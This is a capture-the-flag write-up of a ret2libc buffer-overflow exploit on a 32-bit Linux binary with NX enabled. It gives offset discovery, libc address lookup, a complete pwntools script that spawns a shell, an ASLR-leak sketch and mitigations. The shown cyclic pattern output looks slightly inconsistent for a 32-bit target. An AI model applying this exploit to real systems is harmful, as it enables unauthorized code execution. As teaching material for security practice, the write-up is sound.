---
title: "Buffer Overflow - ret2libc Exploitation"
category: "Pwn"
difficulty: "Medium"
author: "havoc"
date: "2025-10-15"
description: "Bypassing NX protection using return-to-libc technique"
---

## Summary

This challenge presented a classic buffer overflow vulnerability in a 32-bit Linux binary with NX (No-Execute) protection enabled. We used the ret2libc technique to bypass this protection and spawn a shell.

## Binary Analysis

First, let's check the binary's security features:

```bash
$ checksec vuln
[*] '/home/user/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
- **NX enabled**: Can't execute shellcode on stack
- **No PIE**: Binary addresses are fixed
- **No canary**: Stack overflow is straightforward

## Vulnerability Discovery

Running the binary:

```bash
$ ./vuln
Enter your name: AAAA
Hello, AAAA!
```

Let's test for buffer overflow:

```bash
$ python -c "print('A' * 200)" | ./vuln
Enter your name: Segmentation fault
```

Perfect! We have a buffer overflow.

## Finding the Offset

Using GDB with pwndbg:

```bash
$ gdb ./vuln
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaa...
pwndbg> r
Enter your name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaa...
Program received signal SIGSEGV
pwndbg> cyclic -l 0x61616172
112
```

The offset is **112 bytes**.

## ret2libc Strategy

Since NX is enabled, we can't execute shellcode. Instead, we'll:
1. Leak libc base address (or use system's known location)
2. Build ROP chain to call `system("/bin/sh")`

## Finding libc Addresses

```bash
$ ldd vuln
    linux-gate.so.1 (0xf7fce000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dc0000)

$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   1534: 00048150    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0

$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 1bd0f5 /bin/sh
```

Offsets found:
- `system`: `0x00048150`
- `"/bin/sh"`: `0x001bd0f5`

## Exploitation Script

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Offsets
offset = 112
system_offset = 0x00048150
binsh_offset = 0x001bd0f5

# Connect (local or remote)
if args.REMOTE:
    p = remote('target.ctf.com', 1337)
    libc_base = 0xf7dc0000  # Need to leak this in real scenario
else:
    p = process('./vuln')
    # For local, we can use ldd to get libc base
    libc_base = 0xf7dc0000

# Calculate addresses
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system(): {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

# Build payload
# [padding][system][exit][/bin/sh]
payload = b'A' * offset
payload += p32(system_addr)  # Return to system()
payload += p32(0xdeadbeef)   # Fake return address (exit)
payload += p32(binsh_addr)   # Argument to system()

# Send payload
p.recvuntil(b'Enter your name: ')
p.sendline(payload)

# Get shell
p.interactive()
```

## Execution

```bash
$ python3 exploit.py
[*] '/home/user/vuln'
    Arch:     i386-32-little
[*] libc base: 0xf7dc0000
[*] system(): 0xf7e08150
[*] /bin/sh: 0xf7f7d0f5
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
CTF{r3t2l1bc_byp4ss_nx_pr0t3ct10n}
```

## Flag

```
CTF{r3t2l1bc_byp4ss_nx_pr0t3ct10n}
```

## Advanced: Bypassing ASLR

If ASLR were enabled, we'd need to leak a libc address first:

```python
# Step 1: Leak libc address using puts()
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols['main']

# Payload to leak puts address
leak_payload = b'A' * offset
leak_payload += p32(puts_plt)
leak_payload += p32(main_addr)  # Return to main
leak_payload += p32(puts_got)

p.sendline(leak_payload)
leaked_puts = u32(p.recv(4))

# Calculate libc base
libc_base = leaked_puts - libc.symbols['puts']
log.info(f"Leaked libc base: {hex(libc_base)}")

# Step 2: Use leaked base to call system()
# ... continue with ret2libc
```

## Lessons Learned

1. **NX doesn't prevent all exploits** - Code reuse attacks still work
2. **Return-oriented programming is powerful** - Can achieve arbitrary code execution
3. **ASLR adds significant complexity** - But information leaks can defeat it
4. **Understanding calling conventions** - Essential for building correct payloads

## Mitigation

- **Enable full RELRO** - Makes GOT read-only
- **Enable PIE** - Randomizes binary addresses
- **Use stack canaries** - Detect buffer overflows
- **Compile with modern protections** - `-fstack-protector-all -pie -Wl,-z,relro,-z,now`
- **Input validation** - Bounds checking on all user input

---

**Difficulty Rating:** 🟡 Medium  
**Category:** Binary Exploitation  
**Points:** 600
